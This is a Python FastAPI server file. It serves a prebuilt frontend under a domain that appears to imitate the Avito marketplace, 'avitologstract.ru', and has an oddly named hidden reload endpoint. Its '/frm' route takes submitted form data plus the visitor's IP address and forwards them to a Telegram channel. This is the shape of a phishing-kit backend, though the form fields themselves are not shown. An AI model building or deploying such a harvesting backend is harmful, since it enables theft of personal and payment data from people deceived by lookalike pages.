import uvicorn
from fastapi import FastAPI, Request
from fastapi.middleware.cors import CORSMiddleware
from fastapi.staticfiles import StaticFiles
from fastapi.responses import FileResponse, RedirectResponse

from dto import RequestModel
from config import TG_MANAGER
from utils import format


app = FastAPI()

app.add_middleware(
    CORSMiddleware,
    allow_origins=['avitologstract.ru'],
    allow_credentials=True,
    allow_methods=["GET", "POST"],
    allow_headers=["*"],
)

app.mount("/static", StaticFiles(directory="frontend/.output/public/static"), name="static")
page_main = FileResponse("frontend/.output/public/index.html")

@app.get("/")
async def index():
    return page_main

@app.get("/PPPIIINNNGG40324")
async def pingg():
    global page_main
    page_main = FileResponse("frontend/.output/public/index.html")
    return RedirectResponse("/")

@app.post("/frm")
async def form(data: RequestModel, request: Request):
    status_code = await TG_MANAGER.send(
        await format(
            str(request.client.host),
            data)
    )
    return {
        "status": status_code,
        "message": "Успешно" if status_code >= 200 and status_code < 300 else "Ошибка"
    }

if __name__ == "__main__":
    uvicorn.run("main:app", reload=False, workers=5, host = "127.0.0.1", port = 7178)